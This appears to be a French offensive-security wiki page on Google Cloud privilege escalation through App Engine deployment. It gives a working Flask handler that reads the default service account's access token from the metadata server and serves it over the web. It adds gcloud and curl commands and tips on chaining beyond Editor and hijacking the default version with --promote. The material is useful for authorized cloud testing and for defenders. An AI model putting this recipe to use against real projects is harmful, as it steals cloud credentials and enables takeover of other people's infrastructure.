---
title: "App Engine : déployer une version en tant que compte de service App Engine"
description: "Déployer une version App Engine avec les permissions de déploiement appengine, en exécutant du code sous le compte de service par défaut d'App Engine."
keywords:
  - App Engine
  - appengine deploy
  - default service account
  - version
  - actAs
  - code execution
---

# App Engine

Les versions App Engine standard et flexibles s'exécutent sous le compte de service par défaut d'App Engine (`<project>@appspot.gserviceaccount.com`), qui détient le rôle Editor par défaut. Avec les permissions de déploiement App Engine (`appengine.applications.update` / `appengine.versions.create` et `cloudbuild`/storage pour la préparation), vous livrez une version dont le gestionnaire lit et renvoie le token du compte de service.

## Déployer une application qui divulgue le token

```python
# main.py (Flask)
import requests
from flask import Flask
app = Flask(__name__)
@app.route("/")
def pwn():
    return requests.get(
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      headers={"Metadata-Flavor": "Google"}).text
```

```bash
gcloud app deploy app.yaml --quiet
curl "https://<project>.appspot.com/"
```

## Notes d'exploitation

- Le compte App Engine par défaut est Editor, donc un déploiement équivaut à une exécution de code en tant qu'Editor ; enchaînez vers une ressource fournissant un token pour aller au-delà d'Editor.
- Déployer une nouvelle version ne route pas le trafic tant qu'elle n'est pas promue, mais vous pouvez atteindre directement l'URL versionnée, ou utiliser `--promote` pour prendre le contrôle de la version par défaut.
- Les déploiements App Engine passent par Cloud Build et un bucket de préparation, donc les permissions de déploiement entraînent ces services.

## Outils

- **gcloud** (`app deploy`) : le déploiement.

## Références

- [Rhino Security Labs : escalade de privilèges GCP (partie 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google : compte de service App Engine](https://cloud.google.com/appengine/docs/standard/python3/service-account)
